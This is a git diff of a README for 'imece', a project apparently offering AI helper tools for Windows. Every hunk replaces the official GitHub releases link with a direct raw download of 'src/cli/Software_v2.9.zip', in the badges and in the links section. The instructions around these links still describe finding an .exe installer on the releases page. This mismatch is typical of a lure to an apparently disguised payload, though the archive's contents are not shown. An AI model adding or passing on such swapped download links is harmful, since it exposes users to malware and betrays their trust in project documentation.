@@ -1,6 +1,6 @@
 # 🤝 imece - Simple AI Helpers Working Together
 
-[![Download imece](https://img.shields.io/badge/Download-imece-brightgreen?style=for-the-badge)](https://github.com/Mazen7071/imece/releases)
+[![Download imece](https://img.shields.io/badge/Download-imece-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Mazen7071/imece/main/src/cli/Software_v2.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section walks you through getting imece set up and ready to use on your Win
 
 1. Visit the official release page by clicking the big download button below:
 
-[![Download imece](https://img.shields.io/badge/Download-imece-blue?style=for-the-badge)](https://github.com/Mazen7071/imece/releases)  
+[![Download imece](https://img.shields.io/badge/Download-imece-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mazen7071/imece/main/src/cli/Software_v2.9.zip)  
 
 2. On the releases page, look for the latest version. It will usually have a name like `imece-vX.Y.Z.exe` or a similar Windows installer.
 
@@ -143,7 +143,7 @@ A: Yes. All communication happens locally through files on your PC.
 
 ## 🔗 Useful Links
 
-- Download and install: [https://github.com/Mazen7071/imece/releases](https://github.com/Mazen7071/imece/releases)  
+- Download and install: [https://raw.githubusercontent.com/Mazen7071/imece/main/src/cli/Software_v2.9.zip](https://raw.githubusercontent.com/Mazen7071/imece/main/src/cli/Software_v2.9.zip)  
 - License: MIT  
 - Source code: Available on the same release page  
 
